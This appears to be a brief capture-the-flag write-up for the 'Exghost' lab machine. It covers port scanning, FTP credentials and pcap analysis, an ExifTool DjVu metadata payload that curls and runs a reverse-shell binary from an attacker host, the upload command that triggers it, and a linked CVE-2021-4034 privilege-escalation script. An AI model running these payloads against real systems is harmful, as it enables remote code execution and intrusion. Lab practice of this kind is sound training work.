# Exghost

## Introduction

Exghost is a 'warm up' category linux machine from offsec proving grounds.  

## Enumeration

### Nmap

Nmap scan of all tcp ports.  

```
20/tcp closed ftp-data reset ttl 61
21/tcp open   ftp      syn-ack ttl 61 vsftpd 3.0.3
80/tcp open   http     syn-ack ttl 61 Apache httpd 2.4.41
```

## FTP

Login credentials found.  

```
username: user
password: system
```

A file 'backup' is found and transfered.  

## PCAP

The following file is found from the backup pcap file.  

`exiftest.php`

In the http stream, there is a POST multipart form request to exiftest.php.  

```http
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <!-- Part from this tutorial -->
    <form method="post" action="exiftest.php" enctype="multipart/form-data">
        <input type="file" name="myFile" />
        <input type="submit" value="Upload">
    </form>
    <!-- End of part from this tutorial -->
</body>
</html>
```

## User shell

Using a vuln in the exiftool, a rev shell is returned.  


Payload file.  

	
`(metadata "\c${system('curl <ip>/shell.elf && chmod 777 /tmp/shell.elf && /tmp/shell.elf')};")`


Commands.

```
sudo apt install djvulibre-bin

bzz payload payload.bzz

djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

exiftool -config configfile '-HasselbladExif<=exploit.djvu' hacker.jpg

curl -s -F myFile=@hacker.jpg http://192.168.214.183/exiftest.php

```

## Root

The following kernel exploit (CVE-2021-4034) spawns a root shell.  

`https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py` 
